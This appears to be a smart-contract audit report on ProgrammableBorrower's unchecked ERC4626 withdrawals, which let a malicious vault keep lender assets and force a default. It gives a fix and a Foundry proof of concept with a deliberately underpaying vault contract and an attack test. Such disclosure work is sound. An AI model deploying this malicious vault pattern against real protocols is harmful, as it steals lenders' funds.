### Title
ProgrammableBorrower trusts ERC4626 withdrawals without verifying received assets, allowing a bad vault to force lender default - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower.onStopEpoch` treats a successful `vault.withdraw(shortfall, ...)` return as proof that `shortfall` underlying tokens were received. It only checks the vault's reported share value before the call, credits `epochWithdrawnFromVault` with the requested amount, marks epoch accounting inactive, and returns `true` to `IdleCDOEpochVariant` without measuring the actual underlying-token balance delta. [1](#0-0) 

A nonconforming or malicious ERC4626 vault can report sufficient assets, burn the borrower's shares, return fewer assets than requested, and still return successfully. `IdleCDOEpochVariant` then trusts the hook's `true` result and attempts to pull the full liability; when the pull fails, it enters the borrower-default path. [2](#0-1) [3](#0-2) 

### Finding Description

The vulnerable sequence occurs while an epoch is running and `stopEpoch` is called:

1. `onStopEpoch` calculates `shortfall = _amountRequired - onHand`.
2. It validates coverage using `_currentVaultAssets()`, which merely multiplies the recorded share balance by `vault.convertToAssets(shares)`. [4](#0-3) [5](#0-4) 
3. It calls `vault.withdraw(shortfall, address(this), address(this))` and assumes that `shortfall` arrived. [6](#0-5) 
4. It records `epochWithdrawnFromVault += shortfall`, resets accounting, and returns `success = true`. [7](#0-6) 
5. `IdleCDOEpochVariant` accepts that success flag and calls `getFundsFromBorrower` for the full amount. If the vault under-delivered, the transfer fails and the catch branch invokes `_handleBorrowerDefault`. [2](#0-1) [3](#0-2) 

The missing post-condition check means a failed delivery is represented as a borrower funding failure instead of a retryable vault-liquidity failure.

### Impact Explanation

An attacker-controlled integrated vault can permanently appropriate the under-delivered portion of pool assets and cause the credit vault to enter default. The direct loss is:

```text
loss = requestedShortfall - actualUnderlyingReceived
```

With no on-hand balance and a vault that returns zero while reporting success, the loss equals the full stop-epoch withdrawal requirement. The attack also crystallizes a default even though the shortfall was created by the external vault rather than the borrower.

Because `epochAccountingActive` is cleared inside `onStopEpoch` before the CDO verifies that the funds arrived, the same invocation cannot simply be retried after the CDO pull fails. [7](#0-6) 

### Likelihood Explanation

This requires the configured ERC4626 vault to violate the expected post-withdrawal invariant or to be malicious. The vault is a replaceable external integration rather than an immutable protocol primitive, so the borrower adapter should not equate a successful external return value with receipt of the requested assets. [8](#0-7) 

The issue is not prevented by the current coverage check because `_currentVaultAssets()` trusts the vault's reported share valuation. It is also not prevented by the `try/catch` because an under-delivering vault can return normally rather than revert. [9](#0-8) 

### Recommendation

Verify actual balance deltas around every external vault settlement:

```solidity
uint256 balanceBefore = underlyingToken.balanceOf(address(this));
uint256 shares = vault.withdraw(shortfall, address(this), address(this));
uint256 received = underlyingToken.balanceOf(address(this)) - balanceBefore;
if (received < shortfall) revert StopEpochVaultLiquidityUnavailable();
epochWithdrawnFromVault += received;
```

Apply the same principle to `_borrow`, `_depositToVault`, and `emergencyExitVault`: measure the underlying received or shares minted rather than relying solely on ERC4626 return values. `epochWithdrawnFromVault` should record only realized proceeds, and accounting should not be marked inactive until the actual withdrawal post-condition has been established. [10](#0-9) [11](#0-10) 

### Proof of Concept

A Foundry PoC can fork the existing programmable-borrower deployment, point `ProgrammableBorrower` at a vault that reports full coverage but under-delivers on `withdraw`, create a pending withdrawal, and call `stopEpoch`.

```solidity
// test/foundry/ProgrammableBorrowerMissingProceeds.t.sol
contract UnderpayingVault {
    IERC20Detailed public immutable assetToken;
    mapping(address => uint256) public balanceOf;
    uint256 public payoutRatioBps; // 0 = deliver nothing

    constructor(IERC20Detailed asset_) {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        shares = assets;
        balanceOf[receiver] += shares;
        assetToken.transferFrom(msg.sender, address(this), assets);
    }

    function convertToAssets(uint256 shares)
        external
        view
        returns (uint256)
    {
        // Report full backing even though withdraw intentionally underpays.
        return shares;
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256 shares) {
        shares = assets;
        balanceOf[owner] -= shares;

        uint256 payout = assets * payoutRatioBps / 10_000;
        if (payout != 0) {
            assetToken.transfer(receiver, payout);
        }
    }
}
```

The attack sequence is:

```solidity
function testUnderpayingVaultForcesDefault() external {
    uint256 amount = 10_000 * oneScale;

    UnderpayingVault badVault = new UnderpayingVault(underlying);

    // Honest operator configures the external ERC4626 integration before epoch start.
    vm.prank(borrowerManager);
    programmableBorrower.setVault(address(badVault));

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(0);

    // All lender funds are now held as shares of the underpaying vault.
    assertEq(badVault.balanceOf(address(programmableBorrower)), amount);

    // Create a real stop-epoch cash liability.
    uint256 requested = amount / 4;
    cdoEpoch.requestWithdraw(requested, address(aaTranche));

    vm.warp(cdoEpoch.epochEndDate() + 1);

    // The vault reports coverage, returns successfully, but transfers zero assets.
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // The missing received amount makes the subsequent CDO transfer fail and
    // sends the pool through the borrower-default path.
    assertTrue(cdoEpoch.defaulted());
    assertEq(underlying.balanceOf(address(badVault)), amount);
}
```

This reproduces the broken invariant: the vault reports `shortfall <= convertToAssets(shares)` and returns successfully, yet `ProgrammableBorrower` receives less than `shortfall`. `IdleCDOEpochVariant` interprets the resulting pull failure as borrower default, allowing the external vault to retain the unpaid assets.
